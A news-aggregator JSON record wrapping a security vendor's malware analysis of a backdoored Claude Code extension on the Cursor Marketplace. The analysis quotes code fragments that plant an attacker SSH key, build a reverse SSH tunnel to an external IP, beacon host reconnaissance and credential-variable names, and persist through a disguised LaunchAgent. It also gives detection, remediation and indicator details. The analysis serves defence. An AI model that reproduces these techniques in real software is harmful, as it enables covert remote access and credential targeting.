@@ -1,0 +1,379 @@
+{
+  "id": 50300683,
+  "storyKey": "hackernews-50300683",
+  "source": "hackernews",
+  "sourceLabel": "Hacker News",
+  "rank": 5,
+  "sourceRank": 5,
+  "type": "story",
+  "title": "Backdoor in Claude Code for VS Code extension on the Cursor Marketplace",
+  "titleZh": "Backdoor in Claude Code for VS Code extension on the Cursor Marketplace",
+  "url": "https://phorion.io/blog/offical-claude-code-vsx-compromise/",
+  "domain": "phorion.io",
+  "hnUrl": "https://news.ycombinator.com/item?id=50300683",
+  "discussionUrl": "https://news.ycombinator.com/item?id=50300683",
+  "author": "_chall",
+  "score": 890,
+  "publishedAt": "2026-10-30T07:09:12.000Z",
+  "commentsCount": 529,
+  "category": "AI",
+  "relevanceScore": 100,
+  "relevanceReason": "命中 2 个 AI/科技关键词。",
+  "hotScore": 3685.4,
+  "snapshotBestRank": 2,
+  "snapshotBestRankSource": "topstories",
+  "snapshotMaxScore": 890,
+  "snapshotMaxComments": 529,
+  "snapshotFirstSeenAt": "2026-10-30T17:09:31.181Z",
+  "snapshotLastSeenAt": "2026-10-31T09:56:26.810Z",
+  "snapshotAppearances": 8,
+  "textRawHtml": "<a href=\"https://cursor.com/blog/claude-code-extension-security-notice\" rel=\"nofollow\">https://cursor.com/blog/claude-code-extension-security-notic...</a>",
+  "textZhHtml": "<a href=\"https://cursor.com/blog/claude-code-extension-security-notice\" rel=\"nofollow\">https://cursor.com/blog/claude-code-extension-security-notic...</a>",
+  "summaryRaw": [
+    "TL;DRPhorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered.Update (31 October 2026): Cursor’s security notice now identifies versions 2.1.312 and 2.1.313 distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only 2.1.313; the affected-version guidance below has been updated accordingly.Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313, from its marketplace.While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.Infection ChainThe Cursor Marketplace ExtensionThe compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.Stage 1 - Preparing SSH AccessFirst, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.var sd = path.join(HOME, \".ssh\"), ak = path.join(sd, \"authorized_keys\"); // ... if (cur.indexOf(\"svc-telemetry\") < 0) { fs.appendFileSync(ak, PUB + \"\\n\"); d.sshKey = \"added\" } else { d.sshKey = \"present\" } Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.Windows: tries to install and start OpenSSH Server using PowerShell.None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.A bug in the macOS SSH logic?On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:// ... else if (PLAT === \"darwin\") { var rl = ex(\"systemsetup -getremotelogin 2>/dev/null\", 4000); d.remoteLogin = rl; if (/Off/i.test(rl)) { det(\"sudo -n systemsetup -setremotelogin on >/dev/null 2>&1\"); d.remoteLoginOn = \"tried\" } } Notice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:You need administrator access to run this tool... exiting! systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:function ex(c, t) { try { return cp.execSync(c, { timeout: t || 3000, stdio: [\"ignore\", \"pipe\", \"ignore\"], windowsHide: true }).toString().trim() } catch (e) { return \"\" } } Because the output is \"You need administrator access to run this tool... exiting!\", /Off/i.test(rl) evaluates to false.As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.Stage 2 - Establishing the Reverse SSH TunnelNext, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun.It’s worth keeping the two keys straight during an investigation:The public key added to ~/.ssh/authorized_keys (svc-telemetry) lets the attacker log into the victim’s machine.The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:var kf = path.join( TMP, \".stk_\" + crypto.createHash(\"md5\") .update(String(os.hostname()) + HOME).digest(\"hex\").slice(0, 10) ); // ... var RF = (PLAT === \"win32\") ? \"\\\"*:0:localhost:22\\\"\" : \"'*:0:localhost:22'\"; The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine:Affected host -- outbound SSH tunnel --> External SSH server",
+    "Operator -- separate connection --> Server's allocated port | Through the existing tunnel | v Affected host's SSH:22 | Login using the planted key Because the tunnel runs with -N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), and ExitOnForwardFailure is turned on.If autossh is installed, the script uses it; otherwise it falls back to standard ssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.Stage 3 - Keeping Access AvailableTo survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:PlatformArtifactsPersistence mechanismNotesLinux~/.config/.smt, ~/.config/.smtkWrites a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab.Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).macOS~/.config/.smt, ~/.config/.smtk, ~/Library/LaunchAgents/com.apple.sysmond.plistWrites a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true, then loads it via launchctl.Runs in the user context rather than as a root LaunchDaemon.Windows~/.config/smt.cmd, ~/.config/smtk, %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmdTries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder.Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login.On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop.On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/:<key>Label</key> <string>com.apple.sysmond</string> <!-- ... --> <key>RunAtLoad</key> <true/> <key>KeepAlive</key> <true/> Stage 4 - Host ReconFinally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:Hostname, username, OS platform, and architectureHome directory, current working directory, and global Git email (git config --global user.email)Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/iThe environment variable check uses Object.keys(process.env):Object.keys(process.env) .filter(function(k) { return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k) }) .slice(0, 40) Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.To get the machine’s public IP, the script queries ifconfig[.]me, falling back to api[.]ipify[.]org.It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099:var r = http.request({ host: h, port: p, path: \"/beacon\", method: \"POST\", timeout: 3000, headers: {\"content-type\": \"application/json\"} }, function(res) { res.resume() }); // ... r.write(JSON.stringify(d)); r.end() Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.Detection OpportunitiesFrom a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.SSH Key and Configuration ChangesBecause the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync, process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper, Cursor Helper, etc.) creating or writing to ~/.ssh/authorized_keys.Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.While you should also monitor for systemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.User LaunchAgent PersistenceThe persistence setup on macOS gives us a couple of strong signals:A non-Apple process writing a plist with a com.apple.* label (~/Library/LaunchAgents/com.apple.sysmond.plist).A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory (~/.config/.smt).Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together.SSH Tunnels and Follow-On AccessOn the process and network side, look for:ssh or autossh launched with remote port forwarding (-R *:0:localhost:22) and identity files pulled from /tmp/.stk_* or ~/.config/.smtk.Outbound SSH connections to 134.209.82[.]225 on port 22, alongside HTTP POST requests to 134.209.82[.]225:8099 (and connection attempts to 127.0.0.1:8099).If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from localhost (127.0.0.1 or ::1) authenticating with the svc-telemetry key.RemediationIf you identify an affected machine, uninstalling the extension alone won’t remove the backdoor. Make sure your response covers all of the stages it drops:Kill active tunnel processes: Terminate the /bin/sh retry loop and any ssh or autossh processes connecting to 134.209.82[.]225.Remove persistence: Unload and delete ~/Library/LaunchAgents/com.apple.sysmond.plist on macOS (or clean up the @reboot cron entry on Linux / SysMon scheduled task and Startup script on Windows), and remove ~/.config/.smt and ~/.config/.smtk.Clean up SSH keys and state: Remove the svc-telemetry public key from ~/.ssh/authorized_keys, delete /tmp/.stk_*, and verify that Remote Login (SSH) hasn’t been enabled unexpectedly.Rotate credentials: If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the KEY|TOKEN|SECRET|PASS|AWS|GCP environment variable filter).Phorion’s ApproachPhorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating com.apple.* LaunchAgents and LaunchAgents executing shell scripts from hidden directories.Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying ~/.ssh/authorized_keys directly, and Phorion Protections can be used to lock down ~/.ssh/ so that only authorised processes can read or modify SSH keys and configuration files in the first place.If you want to see how Phorion detects and blocks supply chain threats like this across your Mac fleet, get in touch to arrange a demo.IndicatorsSample and Public-Key FingerprintsIndicatorValueNotesSHA-256ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15Backdoored extension.js bundleVictim-login public-key fingerprintSHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htkEd25519 key appended to ~/.ssh/authorized_keys (comment svc-telemetry)Tunnel public-key fingerprintSHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQEmbedded Ed25519 key used to authenticate to the tunnel server (comment svc-telemetry-tun)Network IndicatorsIndicatorTypeNotes134.209.82[.]225 (TCP 22, user tunnel)IP / SSHOutbound reverse SSH tunnel server134.209.82[.]225:8099 (POST /beacon)IP / HTTPExternal host-report beacon endpoint127.0.0.1:8099 (POST /beacon)Loopback / HTTPLocal beacon destinationifconfig[.]me, api[.]ipify[.]orgDomainLegitimate services queried for public IP discoveryHost ArtifactsArtifactPlatformNotes~/.<ide>/extensions/anthropic.claude-code-2.1.312-darwin-arm64macOS (Apple Silicon)Additional affected version identified in Cursor’s security notice (<ide> varies by editor)~/.<ide>/extensions/anthropic.claude-code-2.1.313-darwin-arm64macOS (Apple Silicon)Installed extension directory (<ide> varies by editor)~/.ssh/authorized_keys (comment svc-telemetry)AllPlanted Ed25519 public key<TMP>/.stk_<10 hex chars> ($TMPDIR/.stk_* on macOS)AllInitial tunnel private key in the OS temporary directory (suffix is first 10 hex chars of MD5(hostname + HOME))~/.config/.smt and ~/.config/.smtkmacOS, LinuxPersistence shell script and recreated tunnel private key~/Library/LaunchAgents/com.apple.sysmond.plistmacOSUser LaunchAgent executing /bin/sh ~/.config/.smt@reboot cron entry for ~/.config/.smtLinuxUser crontab persistence~/.config/smt.cmd and ~/.config/smtkWindowsPersistence batch script and tunnel private keyScheduled task SysMonWindowsStartup scheduled task (requests SYSTEM)%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmdWindowsStartup folder fallback script"
+  ],
+  "summaryZh": [
+    "TL;DRPhorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered.Update (31 October 2026): Cursor’s security notice now identifies versions 2.1.312 and 2.1.313 distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only 2.1.313; the affected-version guidance below has been updated accordingly.Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313, from its marketplace.While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.Infection ChainThe Cursor Marketplace ExtensionThe compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.Stage 1 - Preparing SSH AccessFirst, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.var sd = path.join(HOME, \".ssh\"), ak = path.join(sd, \"authorized_keys\"); // ... if (cur.indexOf(\"svc-telemetry\") < 0) { fs.appendFileSync(ak, PUB + \"\\n\"); d.sshKey = \"added\" } else { d.sshKey = \"present\" } Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.Windows: tries to install and start OpenSSH Server using PowerShell.None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.A bug in the macOS SSH logic?On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:// ... else if (PLAT === \"darwin\") { var rl = ex(\"systemsetup -getremotelogin 2>/dev/null\", 4000); d.remoteLogin = rl; if (/Off/i.test(rl)) { det(\"sudo -n systemsetup -setremotelogin on >/dev/null 2>&1\"); d.remoteLoginOn = \"tried\" } } Notice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:You need administrator access to run this tool... exiting! systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:function ex(c, t) { try { return cp.execSync(c, { timeout: t || 3000, stdio: [\"ignore\", \"pipe\", \"ignore\"], windowsHide: true }).toString().trim() } catch (e) { return \"\" } } Because the output is \"You need administrator access to run this tool... exiting!\", /Off/i.test(rl) evaluates to false.As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.Stage 2 - Establishing the Reverse SSH TunnelNext, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun.It’s worth keeping the two keys straight during an investigation:The public key added to ~/.ssh/authorized_keys (svc-telemetry) lets the attacker log into the victim’s machine.The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:var kf = path.join( TMP, \".stk_\" + crypto.createHash(\"md5\") .update(String(os.hostname()) + HOME).digest(\"hex\").slice(0, 10) ); // ... var RF = (PLAT === \"win32\") ? \"\\\"*:0:localhost:22\\\"\" : \"'*:0:localhost:22'\"; The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine:Affected host -- outbound SSH tunnel --> External SSH server",
+    "Operator -- separate connection --> Server's allocated port | Through the existing tunnel | v Affected host's SSH:22 | Login using the planted key Because the tunnel runs with -N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), and ExitOnForwardFailure is turned on.If autossh is installed, the script uses it; otherwise it falls back to standard ssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.Stage 3 - Keeping Access AvailableTo survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:PlatformArtifactsPersistence mechanismNotesLinux~/.config/.smt, ~/.config/.smtkWrites a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab.Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).macOS~/.config/.smt, ~/.config/.smtk, ~/Library/LaunchAgents/com.apple.sysmond.plistWrites a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true, then loads it via launchctl.Runs in the user context rather than as a root LaunchDaemon.Windows~/.config/smt.cmd, ~/.config/smtk, %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmdTries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder.Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login.On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop.On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/:<key>Label</key> <string>com.apple.sysmond</string> <!-- ... --> <key>RunAtLoad</key> <true/> <key>KeepAlive</key> <true/> Stage 4 - Host ReconFinally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:Hostname, username, OS platform, and architectureHome directory, current working directory, and global Git email (git config --global user.email)Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/iThe environment variable check uses Object.keys(process.env):Object.keys(process.env) .filter(function(k) { return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k) }) .slice(0, 40) Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.To get the machine’s public IP, the script queries ifconfig[.]me, falling back to api[.]ipify[.]org.It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099:var r = http.request({ host: h, port: p, path: \"/beacon\", method: \"POST\", timeout: 3000, headers: {\"content-type\": \"application/json\"} }, function(res) { res.resume() }); // ... r.write(JSON.stringify(d)); r.end() Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.Detection OpportunitiesFrom a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.SSH Key and Configuration ChangesBecause the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync, process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper, Cursor Helper, etc.) creating or writing to ~/.ssh/authorized_keys.Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.While you should also monitor for systemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.User LaunchAgent PersistenceThe persistence setup on macOS gives us a couple of strong signals:A non-Apple process writing a plist with a com.apple.* label (~/Library/LaunchAgents/com.apple.sysmond.plist).A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory (~/.config/.smt).Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together.SSH Tunnels and Follow-On AccessOn the process and network side, look for:ssh or autossh launched with remote port forwarding (-R *:0:localhost:22) and identity files pulled from /tmp/.stk_* or ~/.config/.smtk.Outbound SSH connections to 134.209.82[.]225 on port 22, alongside HTTP POST requests to 134.209.82[.]225:8099 (and connection attempts to 127.0.0.1:8099).If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from localhost (127.0.0.1 or ::1) authenticating with the svc-telemetry key.RemediationIf you identify an affected machine, uninstalling the extension alone won’t remove the backdoor. Make sure your response covers all of the stages it drops:Kill active tunnel processes: Terminate the /bin/sh retry loop and any ssh or autossh processes connecting to 134.209.82[.]225.Remove persistence: Unload and delete ~/Library/LaunchAgents/com.apple.sysmond.plist on macOS (or clean up the @reboot cron entry on Linux / SysMon scheduled task and Startup script on Windows), and remove ~/.config/.smt and ~/.config/.smtk.Clean up SSH keys and state: Remove the svc-telemetry public key from ~/.ssh/authorized_keys, delete /tmp/.stk_*, and verify that Remote Login (SSH) hasn’t been enabled unexpectedly.Rotate credentials: If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the KEY|TOKEN|SECRET|PASS|AWS|GCP environment variable filter).Phorion’s ApproachPhorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating com.apple.* LaunchAgents and LaunchAgents executing shell scripts from hidden directories.Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying ~/.ssh/authorized_keys directly, and Phorion Protections can be used to lock down ~/.ssh/ so that only authorised processes can read or modify SSH keys and configuration files in the first place.If you want to see how Phorion detects and blocks supply chain threats like this across your Mac fleet, get in touch to arrange a demo.IndicatorsSample and Public-Key FingerprintsIndicatorValueNotesSHA-256ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15Backdoored extension.js bundleVictim-login public-key fingerprintSHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htkEd25519 key appended to ~/.ssh/authorized_keys (comment svc-telemetry)Tunnel public-key fingerprintSHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQEmbedded Ed25519 key used to authenticate to the tunnel server (comment svc-telemetry-tun)Network IndicatorsIndicatorTypeNotes134.209.82[.]225 (TCP 22, user tunnel)IP / SSHOutbound reverse SSH tunnel server134.209.82[.]225:8099 (POST /beacon)IP / HTTPExternal host-report beacon endpoint127.0.0.1:8099 (POST /beacon)Loopback / HTTPLocal beacon destinationifconfig[.]me, api[.]ipify[.]orgDomainLegitimate services queried for public IP discoveryHost ArtifactsArtifactPlatformNotes~/.<ide>/extensions/anthropic.claude-code-2.1.312-darwin-arm64macOS (Apple Silicon)Additional affected version identified in Cursor’s security notice (<ide> varies by editor)~/.<ide>/extensions/anthropic.claude-code-2.1.313-darwin-arm64macOS (Apple Silicon)Installed extension directory (<ide> varies by editor)~/.ssh/authorized_keys (comment svc-telemetry)AllPlanted Ed25519 public key<TMP>/.stk_<10 hex chars> ($TMPDIR/.stk_* on macOS)AllInitial tunnel private key in the OS temporary directory (suffix is first 10 hex chars of MD5(hostname + HOME))~/.config/.smt and ~/.config/.smtkmacOS, LinuxPersistence shell script and recreated tunnel private key~/Library/LaunchAgents/com.apple.sysmond.plistmacOSUser LaunchAgent executing /bin/sh ~/.config/.smt@reboot cron entry for ~/.config/.smtLinuxUser crontab 